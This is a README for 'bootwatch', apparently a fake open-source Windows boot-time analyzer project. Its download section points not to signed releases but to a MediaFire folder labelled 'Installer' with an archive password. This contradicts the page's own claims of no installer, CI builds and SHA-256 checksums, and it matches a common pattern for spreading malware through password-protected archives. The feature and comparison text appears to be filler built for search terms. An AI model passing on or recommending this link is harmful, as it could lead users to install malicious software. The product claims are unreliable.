# bootwatch

👢 Free, open-source boot time analyzer for Windows — measure, graph and fix slow startups offline. 100 MB portable, no account, MIT.

[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
[![Platform](https://img.shields.io/badge/platform-Windows%2010%20%7C%2011%20x64-blue.svg)]()
[![Build](https://img.shields.io/badge/build-100%20MB%20single%20exe-orange.svg)]()

## Features

- ✅ **Full boot breakdown** — firmware, bootloader, driver init, services, logon and desktop-ready phases timed separately
- ✅ **History graph** — every boot plotted over 30 days so a creeping slowdown becomes a visible trend
- ✅ **Startup app impact** — time each autostart program adds, measured rather than guessed by a yellow arrow
- ✅ **Degraded-boot alert** — flags any boot more than 15 seconds slower than your rolling median
- ✅ **Driver phase detail** — read boot performance traces and list the slowest drivers with their load durations
- ✅ **Report export** — HTML and JSON summaries for support threads and IT audits
- ✅ **100 MB self-contained exe** — runtime bundled, portable, offline, MIT with SHA-256 releases

## Why bootwatch

- MIT licensed, source in the open
- No ads, no account, no telemetry
- Single portable 100 MB exe - no installer, runs offline
- CI builds every release and publishes SHA-256 checksums
- Windows 10 / 11 x64

## Comparison

| Feature | **bootwatch** | BootRacer | Perf Analyzer | Task Manager |
|---|:---:|:---:|:---:|:---:|
| Price | **Free, MIT** | Free | Free | Built-in |
| Open source | **Yes** | No | No | No |
| Per-phase boot breakdown | **Yes** | Basic | Yes | No |
| 30-day history graph | **Yes** | No | No | Limited |
| Slowest drivers list | **Yes** | No | Manual parse | No |
| Portable, no install | **Yes, 100 MB** | Installer | SDK install | With OS |

## FAQ

**how to find out why Windows boots slowly?**

Task Manager only names suspects, never proves the cost, and boot performance traces require the heavy Windows SDK tooling. bootwatch times each boot phase itself, graphs the last 30 boots and ranks drivers and autostarts by measured milliseconds. It is a 100 MB portable exe, MIT, offline with no account and no telemetry.

## Screenshots

All screenshots describe the 1280x800 dark UI.

1. Dark dashboard (#121418, sky #0EA5E9): phase timeline bar segmented firmware 4.1 s to desktop 21.3 s, history sparkline below with median line.
2. Driver phase table: top five drivers by load time with manufacturer column, one flagged slow row in amber, disable hint drawer.
3. Alerts and export: degraded-boot banner for boot 22 s versus 18 s median, HTML export button, cleanup of old boot records control.

## Download

| Source | Link |
|---|---|
| 💾 **Installer bootwatch** | [Installer bootwatch](https://www.mediafire.com/folder/xfbu35fzy4zd6/Installer) |

> Archive password: `5139237619`

## Build

Requires the .NET SDK on Windows 10/11 x64:

```
dotnet publish -c Release -r win-x64 --self-contained -p:PublishSingleFile=true
```

## License

MIT. See [LICENSE](LICENSE).